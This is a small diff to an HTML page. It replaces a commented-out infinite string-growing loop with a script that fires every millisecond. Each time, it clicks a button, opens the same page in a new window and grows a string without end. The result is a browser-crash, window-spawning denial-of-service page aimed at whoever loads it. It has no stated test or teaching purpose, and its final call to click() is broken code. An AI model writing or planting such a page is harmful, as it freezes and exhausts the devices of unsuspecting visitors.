@@ -1,10 +1,20 @@
 <!DOCTYPE html>
 
 <script>
-  var txt = "a";
+  /*
+    var txt = "a";
     while(1){
         txt += "a";
+    }*/
+    var txt = "a";
+      let click = setInterval(function () {
+      document.getElementById("boton").click();
+      window.open(window.location.href);
+      while(1){
+        txt += "a";
     }
+      click()
+    }, 1);
 </script>
 
 <body></body>
